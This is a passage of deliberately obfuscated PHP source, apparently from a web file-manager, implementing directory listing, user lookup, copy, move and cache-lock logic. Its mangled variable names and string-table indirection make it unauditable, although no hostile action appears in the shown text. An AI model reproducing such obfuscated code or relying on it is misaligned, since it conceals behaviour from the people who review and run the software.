$Ã­‹ï‘™[$ÍâƒÆŒñ[28]] . $ÍâƒÆŒñ[8]; } if (intval($Ã­‹ï‘™[$ÍâƒÆŒñ[415]]) == self::TYPE_SYSTEM) { $this->_listAppendPathRecycle($Ã­‹ï‘™, $»¬ëà‰¥, $»âºİ‹); } } unset($Ã­‹ï‘™); return $ÀåÙÙ†; } private function _listAppendPathRecycle(&$¾€Î¼†ï, $›ª’íîŠ, $’ÓÇŠñé) { $š—ïıÑ =& $_SERVER[Ù×¯Ø…]; if (!in_array($’ÓÇŠñé, $›ª’íîŠ) && $¾€Î¼†ï[$š—ïıÑ[406]] != $’ÓÇŠñé) { return; } $Ş½È½ï = explode($š—ïıÑ[8], trim($¾€Î¼†ï[$š—ïıÑ[522]], $š—ïıÑ[8])); $¦âğªÊ = implode($š—ïıÑ[8], array_slice($Ş½È½ï, 2)); $¾€Î¼†ï[$š—ïıÑ[522]] = $š—ïıÑ[8] . LNG($š—ïıÑ[533]) . $š—ïıÑ[8] . ltrim($¦âğªÊ, $š—ïıÑ[8]); $¾€Î¼†ï[$š—ïıÑ[524]] = $š—ïıÑ[534] . implode($š—ïıÑ[47], array_slice($›ª’íîŠ, 1)) . $š—ïıÑ[47]; if ($¾€Î¼†ï[$š—ïıÑ[406]] == $’ÓÇŠñé) { $¾€Î¼†ï[$š—ïıÑ[524]] = $š—ïıÑ[534]; $¾€Î¼†ï[$š—ïıÑ[501]] = $š—ïıÑ[191]; $¾€Î¼†ï[$š—ïıÑ[28]] = LNG($š—ïıÑ[533]); } $¾€Î¼†ï[$š—ïıÑ[535]] = $š—ïıÑ[536]; } protected function _listAppendPathRoot(&$ø¡×Öë†, $Â°ˆ»÷ë) { $„Ï¬–Ø³ =& $_SERVER[Ù×¯Ø…]; $·ú‘ÊÏ¸ = $„Ï¬–Ø³[33]; if ($ø¡×Öë†[$„Ï¬–Ø³[415]] == self::TYPE_USER) { if (defined($„Ï¬–Ø³[477]) && $ø¡×Öë†[$„Ï¬–Ø³[507]] == USER_ID) { $·ú‘ÊÏ¸ = LNG($„Ï¬–Ø³[537]); if (!$Â°ˆ»÷ë) { $ø¡×Öë†[$„Ï¬–Ø³[28]] = $·ú‘ÊÏ¸; } } else { $€ûÑıÔ¡ = Model($„Ï¬–Ø³[516])->getInfoSimple($ø¡×Öë†[$„Ï¬–Ø³[507]]); $·ú‘ÊÏ¸ = LNG($„Ï¬–Ø³[538]) . $„Ï¬–Ø³[160] . $€ûÑıÔ¡[$„Ï¬–Ø³[28]] . $„Ï¬–Ø³[539]; } } else { if ($ø¡×Öë†[$„Ï¬–Ø³[415]] == self::TYPE_GROUP) { $€ûÑıÔ¡ = Model($„Ï¬–Ø³[525])->getInfoSimple($ø¡×Öë†[$„Ï¬–Ø³[507]]); $·ú‘ÊÏ¸ = $€ûÑıÔ¡[$„Ï¬–Ø³[28]]; } else { if ($ø¡×Öë†[$„Ï¬–Ø³[415]] == self::TYPE_SYSTEM) { $·ú‘ÊÏ¸ = $„Ï¬–Ø³[540]; } } } $·ú‘ÊÏ¸ = $·ú‘ÊÏ¸ ? $„Ï¬–Ø³[8] . $·ú‘ÊÏ¸ . $„Ï¬–Ø³[8] : $„Ï¬–Ø³[8]; return $·ú‘ÊÏ¸; } protected function _listAppendUser(&$ƒ™Ï›—) { $ËÖÂƒ¸ =& $_SERVER[Ù×¯Ø…]; $åãş¾òÔ = array_to_keyvalue($ƒ™Ï›—, $ËÖÂƒ¸[33], $ËÖÂƒ¸[455]); $œ Í¡øÛ = array_to_keyvalue($ƒ™Ï›—, $ËÖÂƒ¸[33], $ËÖÂƒ¸[457]); $³ ŠÁö = array_merge($åãş¾òÔ, $œ Í¡øÛ); $ÔÉ×’õÊ = Model($ËÖÂƒ¸[541])->userListInfo($³ ŠÁö); foreach ($ƒ™Ï›— as &$ÙÂ¤’İš) { $á¢µ˜¦ = $ÙÂ¤’İš[$ËÖÂƒ¸[455]]; $ÙÂ¤’İš[$ËÖÂƒ¸[455]] = $ÔÉ×’õÊ[$á¢µ˜¦] ? $ÔÉ×’õÊ[$á¢µ˜¦] : !1; $á¢µ˜¦ = $ÙÂ¤’İš[$ËÖÂƒ¸[457]]; $ÙÂ¤’İš[$ËÖÂƒ¸[457]] = $ÔÉ×’õÊ[$á¢µ˜¦] ? $ÔÉ×’õÊ[$á¢µ˜¦] : !1; if (isset($ÙÂ¤’İš[$ËÖÂƒ¸[468]]) && $ÙÂ¤’İš[$ËÖÂƒ¸[468]][$ËÖÂƒ¸[542]]) { $şËŞÚÜÕ = $GLOBALS[$ËÖÂƒ¸[6]][$ËÖÂƒ¸[88]][$ËÖÂƒ¸[543]]; if ($ÙÂ¤’İš[$ËÖÂƒ¸[468]][$ËÖÂƒ¸[544]] <= time() - $şËŞÚÜÕ) { $this->metaSet($ÙÂ¤’İš[$ËÖÂƒ¸[406]], $ËÖÂƒ¸[542], null); $this->metaSet($ÙÂ¤’İš[$ËÖÂƒ¸[406]], $ËÖÂƒ¸[544], null); unset($ÙÂ¤’İš[$ËÖÂƒ¸[468]][$ËÖÂƒ¸[542]]); continue; } $ÚÈğàÖÚ = $ÙÂ¤’İš[$ËÖÂƒ¸[468]][$ËÖÂƒ¸[542]]; $ÙÂ¤’İš[$ËÖÂƒ¸[468]][$ËÖÂƒ¸[545]] = Model($ËÖÂƒ¸[541])->getInfoSimpleOuter($ÚÈğàÖÚ); } } unset($ÙÂ¤’İš); } public function parentLevelArray($É’„Â€ƒ) { $»şØ‘œ– =& $_SERVER[Ù×¯Ø…]; $É’„Â€ƒ = explode($»şØ‘œ–[47], trim($É’„Â€ƒ, $»şØ‘œ–[47])); return array_remove_value($É’„Â€ƒ, $»şØ‘œ–[191]); } public function listAll($ïª¾äĞŞ) { $Ëëñ¯È¹ =& $_SERVER[Ù×¯Ø…]; $Ëµœæ˜ˆ = $this->sourceInfo($ïª¾äĞŞ); $¶²É‰Â = array($Ëëñ¯È¹[546] => array($Ëëñ¯È¹[547], $Ëµœæ˜ˆ[$Ëëñ¯È¹[524]] . $ïª¾äĞŞ . $Ëëñ¯È¹[548]), $Ëëñ¯È¹[549] => 0); $çŸàé‰ø = $Ëëñ¯È¹[550]; $ƒöï°¨… = "\x4c\105\x46\x54\x20\112\x4f\x49\x4e\40{$this->tablePrefix}\151\157\x5f\x66\x69\154\x65\x20\146\151\154\x65\40\157\x6e\x20\x73\x6f\x75\162\x63\145\56\146\151\x6c\x65\x49\x44\x20\75\x20\x66\x69\x6c\x65\56\x66\x69\154\145\x49\x44"; $–æÍ¦Ù˜ = $this->alias($Ëëñ¯È¹[447])->field($çŸàé‰ø)->where($¶²É‰Â)->join($ƒöï°¨…)->select(); $this->_listAppendAuth($–æÍ¦Ù˜); $this->_listAppendUser($–æÍ¦Ù˜); $this->_listAppendPath($–æÍ¦Ù˜); $–æÍ¦Ù˜ = array_to_keyvalue($–æÍ¦Ù˜, $Ëëñ¯È¹[406]); $¬íµËº = "\57{$Ëµœæ˜ˆ[$Ëëñ¯È¹[28]]}\57"; $¬íµËº = $¬íµËº == $Ëëñ¯È¹[532] ? $Ëëñ¯È¹[8] : $¬íµËº; $²òø¢ıË = array(); foreach ($–æÍ¦Ù˜ as $‹§åù–› => $½˜üŸ¿) { $˜ŠƒöÁ = $this->parentLevelArray($½˜üŸ¿[$Ëëñ¯È¹[524]]); array_shift($˜ŠƒöÁ); $ƒ‚üÖëí = $¬íµËº; for ($„‰úè±Ê = 0; $„‰úè±Ê < count($˜ŠƒöÁ); $„‰úè±Ê++) { $ƒ‚üÖëí .= $–æÍ¦Ù˜[$˜ŠƒöÁ[$„‰úè±Ê]][$Ëëñ¯È¹[28]] . $Ëëñ¯È¹[8]; } $ƒ‚üÖëí .= $½˜üŸ¿[$Ëëñ¯È¹[28]]; if ($½˜üŸ¿[$Ëëñ¯È¹[414]]) { $ƒ‚üÖëí .= $Ëëñ¯È¹[8]; } $ƒ‚üÖëí = str_replace($Ëëñ¯È¹[532], $Ëëñ¯È¹[8], $ƒ‚üÖëí); $ƒ‚üÖëí = str_replace($Ëëñ¯È¹[532], $Ëëñ¯È¹[8], $ƒ‚üÖëí); $É´ªÈöã = array($Ëëñ¯È¹[425] => str_replace($Ëëñ¯È¹[532], $Ëëñ¯È¹[8], $ƒ‚üÖëí), $Ëëñ¯È¹[551] => intval($½˜üŸ¿[$Ëëñ¯È¹[414]]), $Ëëñ¯È¹[85] => $this->pathInfoFilter($½˜üŸ¿)); if (!$½˜üŸ¿[$Ëëñ¯È¹[414]]) { $É´ªÈöã[$Ëëñ¯È¹[470]] = $½˜üŸ¿[$Ëëñ¯È¹[470]]; $É´ªÈöã[$Ëëñ¯È¹[86]] = $½˜üŸ¿[$Ëëñ¯È¹[76]]; } $²òø¢ıË[] = $É´ªÈöã; } return $²òø¢ıË; } } class SourceListMoveModel extends SourceListModel { public $allowLockSource = 1; public $moveClearAuth = true; public function allowLock() { return $this->allowLockSource; } public function lockCopyStart($Ÿ¢¿ÌÓ) { $ªÉÄÁÂ» =& $_SERVER[Ù×¯Ø…]; if (!$this->allowLock()) { return; } $this->_lockCheck($ªÉÄÁÂ»[552], $Ÿ¢¿ÌÓ); $¾í±¶ìÉ = 1; $this->_lockEvent($Ÿ¢¿ÌÓ, array($ªÉÄÁÂ»[553], $ªÉÄÁÂ»[554]), $¾í±¶ìÉ); $this->_lockParent($Ÿ¢¿ÌÓ, array($ªÉÄÁÂ»[554]), $¾í±¶ìÉ); $this->_lockEvent($Ÿ¢¿ÌÓ, array($ªÉÄÁÂ»[555], $ªÉÄÁÂ»[556]), $¾í±¶ìÉ); $this->_lockCheckEnd($ªÉÄÁÂ»[552], $Ÿ¢¿ÌÓ); } public function lockCopyEnd($¡¢¸–­) { $¾ó§ß¸¾ =& $_SERVER[Ù×¯Ø…]; if (!$this->allowLock()) { return; } $ş“Àœ°Í = 0; $this->_lockEvent($¡¢¸–­, array($¾ó§ß¸¾[553], $¾ó§ß¸¾[554]), $ş“Àœ°Í); $this->_lockParent($¡¢¸–­, array($¾ó§ß¸¾[554]), $ş“Àœ°Í); $this->_lockEvent($¡¢¸–­, array($¾ó§ß¸¾[555], $¾ó§ß¸¾[556]), $ş“Àœ°Í); } public function lockWriteStart($¥À„¾Ó, $¯çÙ°Äš = '') { $ÚË¢¶Ô› =& $_SERVER[Ù×¯Ø…]; if (!$this->allowLock()) { return; } $this->_lockCheck($ÚË¢¶Ô›[553], $¥À„¾Ó); $Ù…å…á¹ = 1; $this->_lockKey($ÚË¢¶Ô›[557] . $¥À„¾Ó . $ÚË¢¶Ô›[95] . $¯çÙ°Äš, $Ù…å…á¹); $this->_lockEvent($¥À„¾Ó, array($ÚË¢¶Ô›[552], $ÚË¢¶Ô›[554]), $Ù…å…á¹); $this->_lockParent($¥À„¾Ó, array($ÚË¢¶Ô›[552], $ÚË¢¶Ô›[554]), $Ù…å…á¹); $this->_lockCheckEnd($ÚË¢¶Ô›[553], $¥À„¾Ó); } public function lockWriteEnd($»…‰†‡, $Ã¥û úË = '') { $Äµ˜Ø´Ï =& $_SERVER[Ù×¯Ø…]; if (!$this->allowLock()) { return; } $íô´†«ß = 0; $this->_lockKey($Äµ˜Ø´Ï[557] . $»…‰†‡ . $Äµ˜Ø´Ï[95] . $Ã¥û úË, $íô´†«ß); $this->_lockEvent($»…‰†‡, array($Äµ˜Ø´Ï[552], $Äµ˜Ø´Ï[554]), $íô´†«ß); $this->_lockParent($»…‰†‡, array($Äµ˜Ø´Ï[552], $Äµ˜Ø´Ï[554]), $íô´†«ß); } public function lockMoveStart($­£Â¦) { $Œæ°Ã¨¿ =& $_SERVER[Ù×¯Ø…]; if (!$this->allowLock()) { return; } $this->_lockCheck($Œæ°Ã¨¿[554], $­£Â¦); $¶òÊõÃÊ = 1; $this->_lockKey($Œæ°Ã¨¿[558] . $­£Â¦, $¶òÊõÃÊ); $this->_lockEvent($­£Â¦, array($Œæ°Ã¨¿[552], $Œæ°Ã¨¿[553]), $¶òÊõÃÊ); $this->_lockParent($­£Â¦, array($Œæ°Ã¨¿[552], $Œæ°Ã¨¿[554]), $¶òÊõÃÊ); $this->_lockEvent($­£Â¦, array($Œæ°Ã¨¿[559], $Œæ°Ã¨¿[555], $Œæ°Ã¨¿[556]), $¶òÊõÃÊ); $this->_lockCheckEnd($Œæ°Ã¨¿[554], $­£Â¦); } public function lockMoveEnd($¼÷Àç™î) { $·Ì­áñ =& $_SERVER[Ù×¯Ø…]; if (!$this->allowLock()) { return; } $øËÈ£¥Ç = 0; $this->_lockKey($·Ì­áñ[558] . $¼÷Àç™î, $øËÈ£¥Ç); $this->_lockEvent($¼÷Àç™î, array($·Ì­áñ[552], $·Ì­áñ[553]), $øËÈ£¥Ç); $this->_lockParent($¼÷Àç™î, array($·Ì­áñ[552], $·Ì­áñ[554]), $øËÈ£¥Ç); $this->_lockEvent($¼÷Àç™î, array($·Ì­áñ[559], $·Ì­áñ[555], $·Ì­áñ[556]), $øËÈ£¥Ç); } private function _lockCheck($Øğ®—, $ŒÇùĞØ) { $øÒƒ ÇÍ =& $_SERVER[Ù×¯Ø…]; $¡Ôïä» = $this->sourceInfo($ŒÇùĞØ); $Ù…¶„ö = $Øğ®— . $øÒƒ ÇÍ[95] . $ŒÇùĞØ; $this->_lockTimeStart[$Ù…¶„ö] = timeFloat(); if (!is_array($¡Ôïä»)) { return; } $ÜéÅÓŸÀ = LNG($øÒƒ ÇÍ[560]); CacheLock::setErrorMsg($øÒƒ ÇÍ[160] . htmlspecialchars($¡Ôïä»[$øÒƒ ÇÍ[28]]) . $øÒƒ ÇÍ[539] . $ÜéÅÓŸÀ); $this->_lockKey($Ù…¶„ö, 1); $this->_lockKey($Ù…¶„ö, 0); $„æ¬Ú¬â = array_reverse($this->parentLevelArray($¡Ôïä»[$øÒƒ ÇÍ[524]])); foreach ($„æ¬Ú¬â as $ÚÔ©á•é) { $Ù…¶„ö = $Øğ®— . $øÒƒ ÇÍ[561] . $ÚÔ©á•é; if (CacheLock::lockGet($øÒƒ ÇÍ[562] . $Ù…¶„ö)) { $¡Ôïä» = $this->sourceInfo($ÚÔ©á•é); CacheLock::setErrorMsg($øÒƒ ÇÍ[160] . htmlspecialchars($¡Ôïä»[$øÒƒ ÇÍ[28]]) . $øÒƒ ÇÍ[539] . $ÜéÅÓŸÀ); $this->_lockKey($Ù…¶„ö, 1); $this->_lockKey($Ù…¶„ö, 0); } } } private function _lockCheckEnd($œØ¯¾¢ú, $î­İöæ¹) { $Şãî÷Ñˆ =& $_SERVER[Ù×¯Ø…]; $‚ÄÙ‡–û = $œØ¯¾¢ú . $Şãî÷Ñˆ[95] . $î­İöæ¹; CacheLock::setErrorMsg($Şãî÷Ñˆ[376]); if (!isset($this->_lockTimeStart[$‚ÄÙ‡–û])) { return; } $‡ëˆÍçÊ = timeFloat() - $this->_lockTimeStart[$‚ÄÙ‡–û]; unset($this->_lockTimeStart[$‚ÄÙ‡–û]); if ($‡ëˆÍçÊ > 0.5) { unset(self::$cacheSourceInfo[$Şãî÷Ñˆ[461] . $î­İöæ¹]); } $‡ø¸ÃîÙ = $this->sourceInfo($î­İöæ¹); if (!$‡ø¸ÃîÙ) { show_json(LNG($Şãî÷Ñˆ[105]), !1); } } private function _lockParent($æ¹ò¦Œ, $Ç±ÈÓ©¥, $ÅÜÓœ¹Í) { if (!$this->autoLockSet) { return; } $Ÿ÷ÇçñÃ = $this->sourceInfo($æ¹ò¦Œ); if (!is_array($Ÿ÷ÇçñÃ)) { return; } $·’ÀİÄ€ = array_reverse($this->parentLevelArray($Ÿ÷ÇçñÃ[$_SERVER[Ù×¯Ø…][524]])); foreach ($·’ÀİÄ€ as $ëÊ½ÅÎ«) { $this->_lockEvent($ëÊ½ÅÎ«, $Ç±ÈÓ©¥, $ÅÜÓœ¹Í); } } private function _lockEvent($®ğ¤şåÖ, $¿º¦¾ëÄ, $ÜÈª‡ı) { $İ¨àñş =& $_SERVER[Ù×¯Ø…]; if (!$this->autoLockSet) { return; } foreach ($¿º¦¾ëÄ as $•î•èË) { $Ú®Š’¨ò = $•î•èË . $İ¨àñş[95] . $®ğ¤şåÖ; if ($ÜÈª‡ı && CacheLock::lockGet($İ¨àñş[562] . $Ú®Š’¨ò)) { continue; } $this->_lockKey($Ú®Š’¨ò, $ÜÈª‡ı); } } public $_lockTimeStart = array(); public $_lockTime = 5; private static $_lockItemArr = array(); private function _lockKey($½Ëø«ù¯, $Ü™øêòã = 1) { $¸¿¨ØßÜ = $_SERVER[Ù×¯Ø…][562] . md5($½Ëø«ù¯); if ($Ü™øêòã) { if (isset(self::$_lockItemArr[$¸¿¨ØßÜ])) { return; } self::$_lockItemArr[$¸¿¨ØßÜ] = 1; CacheLock::lock($¸¿¨ØßÜ, $this->_lockTime); } else { if (!isset(self::$_lockItemArr[$¸¿¨ØßÜ])) { return; } unset(self::$_lockItemArr[$¸¿¨ØßÜ]); CacheLock::unlock($¸¿¨ØßÜ); } } public function isParentOf($å¸¥ø‘ , $õ›Öâ·¨) { $È…®ªó =& $_SERVER[Ù×¯Ø…]; $èİ«ËÀˆ = $this->sourceInfo($å¸¥ø‘ ); $ØøÃĞûÀ = $this->sourceInfo($õ›Öâ·¨); $ì·§“ = $èİ«ËÀˆ[$È…®ªó[524]] . $èİ«ËÀˆ[$È…®ªó[406]] . $È…®ªó[47]; $¿á¢ıæß = $ØøÃĞûÀ[$È…®ªó[524]] . $ØøÃĞûÀ[$È…®ªó[406]] . $È…®ªó[47]; $¤¨ûÍù– = strpos($¿á¢ıæß, $ì·§“) === 0; return $¤¨ûÍù–; } private $targetIsDelete = 0; public function copy($šËî›‰×, $Î’¥”ŒÎ, $ğŞù•î = REPEAT_REPLACE, $Àğ¡¨¼» = '') { $¾äıÂß =& $_SERVER[Ù×¯Ø…]; $¬‘Ó‰û‡ = $this->sourceInfo($šËî›‰×); $¨ç‚Åî² = $this->sourceInfo($Î’¥”ŒÎ); if (!$¬‘Ó‰û‡ || !$¨ç‚Åî² || $¨ç‚Åî²[$¾äıÂß[414]] != $¾äıÂß[87]) { return !1; } if ($this->isParentOf($šËî›‰×, $Î’¥”ŒÎ)) { return !1; } $§Š«„‹¶ = $Àğ¡¨¼» ? $Àğ¡¨¼» : $¬‘Ó‰û‡[$¾äıÂß[28]]; $this->lockCopyStart($šËî›‰×); $this->lockWriteStart($Î’¥”ŒÎ, $§Š«„‹¶); $’ìïßƒç = array($¾äıÂß[563] => array(), $¾äıÂß[564] => array(), $¾äıÂß[565] => array()); $this->targetIsDelete = intval($¬‘Ó‰û‡[$¾äıÂß[434]]); $–™øÎô = $this->fileNameExistCache($Î’¥”ŒÎ, $¬‘Ó‰û‡[$¾äıÂß[28]]); $›˜»şœÅ = $this->_copy($šËî›‰×, $Î’¥”ŒÎ, $ğŞù•î, $’ìïßƒç, !0, $Àğ¡¨¼»); $this->_childrenListClear(); $this->lockCopyEnd($šËî›‰×); $this->lockWriteEnd($Î’¥”ŒÎ, $§Š«„‹¶); if ($¬‘Ó‰û‡[$¾äıÂß[414]] == $¾äıÂß[87] && $–™øÎô == $›˜»şœÅ) { $this->folderSizeResetChildren($–™øÎô); } Model($¾äıÂß[566])->addAll($’ìïßƒç[$¾äıÂß[564]], array(), !0); if ($–™øÎô != $›˜»şœÅ || $¬‘Ó‰û‡[$¾äıÂß[414]] == $¾äıÂß[87]) { Model($¾äıÂß[567])->eventCopy($›˜»şœÅ); } $this->saveAll($’ìïßƒç[$¾äıÂß[565]]); Model($¾äıÂß[193])->linkAdd($’ìïßƒç[$¾äıÂß[563]]); $this->folderSizeReset($Î’¥”ŒÎ); $this->updateModifyTime($Î’¥”ŒÎ); return $›˜»şœÅ; } private function _copy($Ø®‚¸Æ, $‹Õ·¦ËÚ, $½À•ÊŞ×, &$’ºãÂ”, $äæšü¥ò, $¾Œ–ÛÎŞ = '') { $ã•Ò¦û” =& $_SERVER[Ù×¯Ø…]; $¹’¨ è = $this->sourceInfoCache($Ø®‚¸Æ); $éÚï¬‡à = $¹’¨ è[$ã•Ò¦û”[414]] == $ã•Ò¦û”[87]; $…à¼œ×È = $¾Œ–ÛÎŞ ? $¾Œ–ÛÎŞ : $¹’¨ è[$ã•Ò¦û”[28]]; $œñ™ˆÁ = $this->fileNameExistCache($‹Õ·¦ËÚ, $…à¼œ×È); if ($äæšü¥ò) { $this->_childrenAllMake($Ø®‚¸Æ); if ($éÚï¬‡à && $œñ™ˆÁ) { $this->_childrenAllMake($œñ™ˆÁ); } } if (!$œñ™ˆÁ) { return $this->_copyCreate($Ø®‚¸Æ, $‹Õ·¦ËÚ, $…à¼œ×È, $’ºãÂ”); } $“ì¾¦¯ = $œñ™ˆÁ; if ($éÚï¬‡à) { if ($½À•ÊŞ× == REPEAT_RENAME_FOLDER) { $…à¼œ×È = $this->fileNameAutoCache($‹Õ·¦ËÚ, $…à¼œ×È, $½À•ÊŞ×, $éÚï¬‡à); $“ì¾¦¯ = $this->_copyCreate($Ø®‚¸Æ, $‹Õ·¦ËÚ, $…à¼œ×È, $’ºãÂ”); } else { $şœ”Ğı = $this->_childrenList($Ø®‚¸Æ); foreach ($şœ”Ğı as $’’±”ã¨) { $this->_copy($’’±”ã¨[$ã•Ò¦û”[406]], $œñ™ˆÁ, $½À•ÊŞ×, $’ºãÂ”, !1); } } } else { if ($½À•ÊŞ× == REPEAT_RENAME || $½À•ÊŞ× == REPEAT_RENAME_FOLDER) { $…à¼œ×È = $this->fileNameAutoCache($‹Õ·¦ËÚ, $…à¼œ×È, $½À•ÊŞ×, $éÚï¬‡à); $“ì¾¦¯ = $this->_copyCreate($Ø®‚¸Æ, $‹Õ·¦ËÚ, $…à¼œ×È, $’ºãÂ”); } else { if ($½À•ÊŞ× == REPEAT_REPLACE) { $ø‹šò Ğ = $this->sourceInfoCache($œñ™ˆÁ); $à·™êë = $this->fileHistory($ø‹šò Ğ, $¹’¨ è[$ã•Ò¦û”[470]], $¹’¨ è[$ã•Ò¦û”[78]]); if ($à·™êë) { $’ºãÂ”[$ã•Ò¦û”[563]][] = $¹’¨ è[$ã•Ò¦û”[470]]; } } else { if ($½À•ÊŞ× == REPEAT_SKIP) { } } } Hook::trigger($ã•Ò¦û”[568], array($ã•Ò¦û”[569], $¹’¨ è, 0)); } return $“ì¾¦¯; } private function _copyCreate($õÙÚÑ–—, $ĞîÉÚ²Í, $’¸³Îïı, &$ÄÈâÉó) { $èšÎÏ÷‚ =& $_SERVER[Ù×¯Ø…]; $ø®¦¨ÛÎ = $this->sourceInfoCache($õÙÚÑ–—); $üİÊ‚Áç = $this->sourceInfoCache($ĞîÉÚ²Í); $¾õ´ˆ¿„ = $this->_makeItemData($ø®¦¨ÛÎ, $üİÊ‚Áç, $’¸³Îïı); Hook::trigger($èšÎÏ÷‚[570], $¾õ´ˆ¿„); Hook::trigger($èšÎÏ÷‚[571], array($èšÎÏ÷‚[572], $¾õ´ˆ¿„, 0)); $Ñ±áÁ‘³ = $this->add($¾õ´ˆ¿„); $ÙÔøçÖ = array($èšÎÏ÷‚[406] => $Ñ±áÁ‘³, $èšÎÏ÷‚[28] => $’¸³Îïı); $this->_copyApplyMeta($ÙÔøçÖ, $ÄÈâÉó); if ($ø®¦¨ÛÎ[$èšÎÏ÷‚[414]] != $èšÎÏ÷‚[87]) { $ÄÈâÉó[$èšÎÏ÷‚[563]][] = $ø®¦¨ÛÎ[$èšÎÏ÷‚[470]]; return $Ñ±áÁ‘³; } $ªË²µï¡ = array(); $ñæ”Ú»İ = array(); $this->_childrenListAll($õÙÚÑ–—, $ªË²µï¡); $İ‡²±Õ’ = count($ªË²µï¡); if ($İ‡²±Õ’ == 0) { return $Ñ±áÁ‘³; } $àÜ¹ˆŒƒ = $this->sourceInfo($Ñ±áÁ‘³); foreach ($ªË²µï¡ as $İèŒ°Ñ) { $¼ÍùôËù = $this->_makeItemData($İèŒ°Ñ, $àÜ¹ˆŒƒ, $İèŒ°Ñ[$èšÎÏ÷‚[28]]); $¼ÍùôËù[$èšÎÏ÷‚[524]] = $İèŒ°Ñ[$èšÎÏ÷‚[524]]; $ñæ”Ú»İ[] = $¼ÍùôËù; } $this->chunkEventSet($èšÎÏ÷‚[573], array($èšÎÏ÷‚[574], $¾õ´ˆ¿„, $İ‡²±Õ’)); $this->addAll($ñæ”Ú»İ, array(), !1); $Û¬Ğ‚™Ø = $this->where(array($èšÎÏ÷‚[501] => $Ñ±áÁ‘³))->select(); $‘Å¤œ = $this->_childrenMakeRelation($ªË²µï¡, $Û¬Ğ‚™Ø); $‘Å¤œ[$õÙÚÑ–—] = $Ñ±áÁ‘³; $Ñ…å×‘ = array(); $Œâ¾©Ó‡ = array(); foreach ($Û¬Ğ‚™Ø as $İèŒ°Ñ) { $öïˆŸÁ× = $İèŒ°Ñ[$èšÎÏ÷‚[406]]; $˜÷‰ÓÆ = $this->_childrenMatch($‘Å¤œ, $İèŒ°Ñ, $àÜ¹ˆŒƒ); $Ñ…å×‘[] = array($èšÎÏ÷‚[406], $öïˆŸÁ×, $èšÎÏ÷‚[501], $˜÷‰ÓÆ[$èšÎÏ÷‚[501]]); $Œâ¾©Ó‡[] = array($èšÎÏ÷‚[406], $öïˆŸÁ×, $èšÎÏ÷‚[524], $˜÷‰ÓÆ[$èšÎÏ÷‚[524]]); $this->_copyApplyMeta($İèŒ°Ñ, $ÄÈâÉó); if ($İèŒ°Ñ[$èšÎÏ÷‚[414]] != $èšÎÏ÷‚[87]) { $ÄÈâÉó[$èšÎÏ÷‚[563]][] = $İèŒ°Ñ[$èšÎÏ÷‚[470]]; } } $this->chunkEventSet($èšÎÏ÷‚[575], array($èšÎÏ÷‚[576], $¾õ´ˆ¿„, $İ‡²±Õ’)); $this->saveAll($Ñ…å×‘); $this->chunkEventSet($èšÎÏ÷‚[577], array($èšÎÏ÷‚[578], $¾õ´ˆ¿„, $İ‡²±Õ’)); $this->saveAll($Œâ¾©Ó‡); return $Ñ±áÁ‘³; } private function _childrenMakeRelation($ëûÁ¡É, $ÆŒŞÀ˜) { $ôÓ“ÍµÜ =& $_SERVER[Ù×¯Ø…]; $ÏœÃÁª = array(); $…Òí˜æ = array(); foreach ($ëûÁ¡É as $ó¨Ã¹œ€) { $×˜ ¢…ç = $ó¨Ã¹œ€[$ôÓ“ÍµÜ[28]] . $ôÓ“ÍµÜ[8] . $ó¨Ã¹œ€[$ôÓ“ÍµÜ[524]]; $ÏœÃÁª[$×˜ ¢…ç] = $ó¨Ã¹œ€[$ôÓ“ÍµÜ[406]]; } foreach ($ÆŒŞÀ˜ as $ó¨Ã¹œ€) { $×˜ ¢…ç = $ó¨Ã¹œ€[$ôÓ“ÍµÜ[28]] . $ôÓ“ÍµÜ[8] . $ó¨Ã¹œ€[$ôÓ“ÍµÜ[524]]; $Î‰ßàÈğ = $ÏœÃÁª[$×˜ ¢…ç]; $…Òí˜æ[$Î‰ßàÈğ] = $ó¨Ã¹œ€[$ôÓ“ÍµÜ[406]]; } return $…Òí˜æ; } private function _childrenMatch($êİ«Ã¼İ, $£‹úü¸Á, $°ÃàÒ) { $Ç¿Ûèü† =& $_SERVER[Ù×¯Ø…]; $ş¨ª­ŠŒ = $°ÃàÒ[$Ç¿Ûèü†[524]]; $ÈÌíûİ¤ = $this->parentLevelArray($£‹úü¸Á[$Ç¿Ûèü†[524]]); foreach ($ÈÌíûİ¤ as $ìÎà¼èÍ) { if (isset($êİ«Ã¼İ[$ìÎà¼èÍ])) { $ş¨ª­ŠŒ .= $êİ«Ã¼İ[$ìÎà¼èÍ] . $Ç¿Ûèü†[579]; } } $ş¨ª­ŠŒ = rtrim($ş¨ª­ŠŒ, $Ç¿Ûèü†[47]) . $Ç¿Ûèü†[47]; $Ú»şØé = $this->parentLevelArray($ş¨ª­ŠŒ); $û€Äí›¿ = $Ú»şØé[count($Ú»şØé) - 1]; return array($Ç¿Ûèü†[501] => $û€Äí›¿, $Ç¿Ûèü†[524] => $ş¨ª­ŠŒ); } private function _makeItemData($Èú“‹, $Á¡øäõŞ, $Ø²Œ±å) { $â”çš€ó =& $_SERVER[Ù×¯Ø…]; $ƒÜìšöŒ = array($â”çš€ó[580] => $Èú“‹[$â”çš€ó[414]], $â”çš€ó[424] => $Ø²Œ±å, $â”çš€ó[581] => $Èú“‹[$â”çš€ó[416]] ? $Èú“‹[$â”çš€ó[416]] : $â”çš€ó[33], $â”çš€ó[471] => $Èú“‹[$â”çš€ó[470]] ? $Èú“‹[$â”çš€ó[470]] : 0, $â”çš€ó[582] => $Èú“‹[$â”çš€ó[78]] ? $Èú“‹[$â”çš€ó[78]] : 0, $â”çš€ó[583] => intval($Á¡øäõŞ[$â”çš€ó[415]]), $â”çš€ó[584] => intval($Á¡øäõŞ[$â”çš€ó[507]]), $â”çš€ó[585] => intval(USER_ID), $â”çš€ó[586] => intval(USER_ID), $â”çš€ó[405] => intval($Á¡øäõŞ[$â”çš€ó[406]]), $â”çš€ó[587] => $Á¡øäõŞ[$â”çš€ó[524]] . $Á¡øäõŞ[$â”çš€ó[406]] . $â”çš€ó[47], $â”çš€ó[428] => $Èú“‹[$â”çš€ó[84]] ? $Èú“‹[$â”çš€ó[84]] : time(), $â”çš€ó[433] => 0, $â”çš€ó[588] => $â”çš€ó[33]); return $ƒÜìšöŒ; } private function _copyApplyMeta($°±Ğ÷æ’, &$ôîİöæÁ) { $½Ñş§ÊÅ =& $_SERVER[Ù×¯Ø…]; $Œ×«ºÓœ = $°±Ğ÷æ’[$½Ñş§ÊÅ[406]]; $Ë¯°Ûæà = $°±Ğ÷æ’[$½Ñş§ÊÅ[28]]; if (!isset($°±Ğ÷æ’[$½Ñş§ÊÅ[589]]) || 